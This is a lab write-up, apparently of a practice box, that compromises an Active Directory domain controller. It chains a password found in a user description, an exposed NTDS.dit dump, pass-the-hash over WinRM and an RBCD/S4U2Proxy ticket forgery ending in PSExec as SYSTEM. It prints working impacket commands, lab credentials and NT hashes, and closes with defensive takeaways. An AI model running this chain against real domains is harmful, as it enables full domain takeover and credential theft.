#Windows #ActiveDirectory #NullSession #PasswordInDescription #NTDS #PassTheHash #BloodHound #RBCD #S4U2Proxy #PSExec

## Overview

Resourced is an Active Directory Domain Controller box that chains four distinct techniques into a full domain compromise. Unauthenticated RPC enumeration exposes a password stored in an LDAP user description field. That credential unlocks an SMB share containing `NTDS.dit` and the SYSTEM hive, an offline dump of the entire domain's credential database. One of those hashes authenticates over WinRM. BloodHound then reveals that account has `GenericAll` over the DC computer object, enabling a Resource-Based Constrained Delegation (RBCD) attack to forge an Administrator service ticket and PSExec as SYSTEM.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Domain: resourced.local
445/tcp  open  microsoft-ds
3268/tcp open  ldap          (GlobalCatalog)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

DC hostname: `RESOURCEDC`. Domain: `resourced.local`. SMB signing required (prevents relay attacks).

### Anonymous RPC Enumeration, Password in Description

`enum4linux-ng` against the DC with a null session returned the full user list via `querydispinfo`. One account description read:

```
V.Ventz : 'New-hired, reminder: HotelCalifornia194!'
```

> **Why LDAP user descriptions leak secrets:** Active Directory's `description` attribute on user objects is readable by any authenticated (and sometimes unauthenticated) user. Admins sometimes put temporary passwords, reminder notes, or onboarding credentials in the description field. Enum4linux and `ldapsearch` both dump these during standard enumeration. It's one of the first places to look after gaining any domain account.

Valid domain credentials from unauthenticated enumeration:

```
V.Ventz : HotelCalifornia194!
```

## Foothold

### SMB, Password Audit Share with NTDS.dit

Authenticating with V.Ventz's credentials revealed a non-standard share:

```
Password Audit    READ ONLY
```

The share contained two files:
- `NTDS.dit`, the Active Directory database, holding every domain credential
- `SYSTEM`, the registry hive needed to decrypt the NTDS encryption keys

Both were downloaded via `smbclient`.

> **What NTDS.dit is and why it's the jackpot:** NTDS.dit is the Active Directory database stored on every Domain Controller. It contains NT hashes for every domain account, including krbtgt, all administrators, and every user. The hashes are encrypted with the Boot Key, which is stored in the SYSTEM registry hive. With both files, `impacket-secretsdump` decrypts and dumps every hash in the domain offline, with no network traffic to the DC.

Offline hash extraction:

```sh
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL \
  -outputfile ntlm
```

Selected hashes from the dump:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
```

### Hash Spray, WinRM Access as L.Livingstone

All extracted hashes were sprayed against SMB:

```sh
crackmapexec smb 192.168.229.175 -u usernames.txt -H hashes --continue-on-success
```

Positive results for `L.Livingstone` and `V.Ventz`. L.Livingstone authenticated over WinRM:

```sh
evil-winrm -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808 -i 192.168.229.175
```

```powershell
*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### BloodHound, GenericAll on RESOURCEDC$

BloodHound collection revealed that `L.Livingstone` held `GenericAll` over the `RESOURCEDC$` computer object. With `GenericAll`, the account can modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, the RBCD control attribute, on the DC's computer object.

The plan: create a new machine account (any authenticated user can do this by default, up to the `MachineAccountQuota` limit), configure the DC to trust that fake machine for delegation, then use S4U2Proxy to get a service ticket impersonating Administrator.

### RBCD Attack, Creating a Fake Computer and Abusing S4U2Proxy

Step 1, Create the fake computer account:

```sh
impacket-addcomputer resourced.local/l.livingstone \
  -dc-ip 192.168.229.175 \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 \
  -computer-name 'ATTACK$' \
  -computer-pass 'AttackerPC1!'

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

Step 2, Write delegation rights using `rbcd.py`:

```sh
sudo python3 rbcd.py -dc-ip 192.168.229.175 -t RESOURCEDC -f 'ATTACK' \
  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into
    msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

> **How RBCD works:** Resource-Based Constrained Delegation lets a computer object declare which other accounts are allowed to impersonate users on its behalf. Normally only domain admins set this. With `GenericAll` over a computer object, any account can write this attribute, pointing it at an attacker-controlled machine account. The S4U2Proxy extension then lets that machine account request service tickets *as any user*, including Administrator, for services on the target machine. The KDC sees this as a legitimate delegation chain.

Step 3, Request an Administrator service ticket via S4U2Proxy:

```sh
impacket-getST -spn cifs/resourcedc.resourced.local \
  resourced/attack\$:'AttackerPC1!' \
  -impersonate Administrator \
  -dc-ip 192.168.229.175

[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

Exporting the ticket:

```sh
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

## Root / SYSTEM

Pass-the-ticket with PSExec using the forged Administrator CIFS ticket:

```sh
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.229.175

[*] Found writable share ADMIN$
[*] Uploading file pebhtsYK.exe
[*] Creating service wUkq on resourcedc.resourced.local.....
[*] Starting service wUkq.....

C:\Windows\system32> whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **LDAP user descriptions are a free credential store.** An unauthenticated RPC null session handed over a plaintext onboarding password left in a description field, no exploitation needed.
- **A "Password Audit" share containing NTDS.dit is the entire domain's keyring.** Any authenticated read of that share produces every NT hash in the domain offline. Classify and monitor non-standard SMB shares as carefully as you would SAM hives.
- **RBCD requires only `GenericAll` over a computer object and `MachineAccountQuota > 0`.** Both conditions are common in default AD configurations. BloodHound surfaces the path; the full chain from hash to SYSTEM spans four impacket commands.
- **Pass-the-ticket with PSExec leaves no password in transit.** The Administrator Kerberos TGS was forged entirely offline; the DC validated it by decrypting the CIFS service ticket with its own key. No password authentication, no Kerberos TGT request for the Administrator account.
